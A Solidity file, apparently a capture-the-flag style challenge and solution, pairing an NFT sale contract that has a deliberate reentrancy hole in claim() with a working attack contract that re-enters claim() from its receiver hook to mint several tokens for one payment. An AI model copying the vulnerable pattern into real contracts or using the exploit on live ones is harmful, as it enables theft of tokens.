// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.7;


import "@openzeppelin/contracts/token/ERC721/extensions/ERC721Enumerable.sol";

contract safeNFT is ERC721Enumerable {
    uint256 price;
    mapping(address=>bool) public canClaim;

    constructor(string memory tokenName, string memory tokenSymbol,uint256 _price) ERC721(tokenName, tokenSymbol) {
        price = _price; //price = 0.01 ETH
    }

    function buyNFT() external payable {
        require(price==msg.value,"INVALID_VALUE");
        canClaim[msg.sender] = true;
    }

    function claim() external {
        require(canClaim[msg.sender],"CANT_MINT");
        _safeMint(msg.sender, totalSupply()); 
        canClaim[msg.sender] = false;
    }
 
}

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract AttackContract is IERC721Receiver {
	address owner;
	safeNFT victim;
	uint counter;

    constructor(address victimAddr) {
		owner = msg.sender;
		victim = safeNFT(victimAddr);
		counter = 0;
	}
	
	function attackStepOne() external payable {
		victim.buyNFT{value: msg.value}();
	}

    function attackStepTwo() external {
        victim.claim();
    }
	
    function onERC721Received(address, address, uint256 tokenId, bytes memory) public virtual override returns (bytes4) {
		if(counter < 5) {
			victim.transferFrom(address(this), owner, tokenId);
			counter++;
			victim.claim();
		}
        return this.onERC721Received.selector;
    }
}